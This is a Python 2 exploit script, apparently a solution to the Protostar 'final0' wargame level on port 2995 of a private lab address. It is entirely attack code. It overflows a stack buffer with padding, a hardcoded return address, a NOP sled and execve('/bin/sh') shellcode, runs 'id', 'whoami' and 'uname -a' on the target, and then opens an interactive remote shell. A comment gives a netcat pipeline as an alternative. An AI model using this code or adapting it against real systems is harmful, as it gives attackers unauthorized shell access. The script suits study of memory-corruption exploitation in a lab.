import struct
import socket
import telnetlib

HOST = '172.16.75.129'
PORT = 2995
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

SC = "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
eip = struct.pack("I", 0xbffff710 + 52)
padding = "\x00" + 'a'*531

payload = padding + eip + "\x90"*100 + SC + "\n"
print payload #if do not use socket, COMMENT lines below and type in terminal
                # "(python final0_shellcode.py; cat) | nc [HOST] [PORT]"

s.send(payload + "\n")
s.send('id\n')
s.send('whoami\n')
s.send('uname -a\n')
print s.recv(1024)
print s.recv(1024)
print s.recv(1024)

t = telnetlib.Telnet()
t.sock = s
t.interact()

s.close()

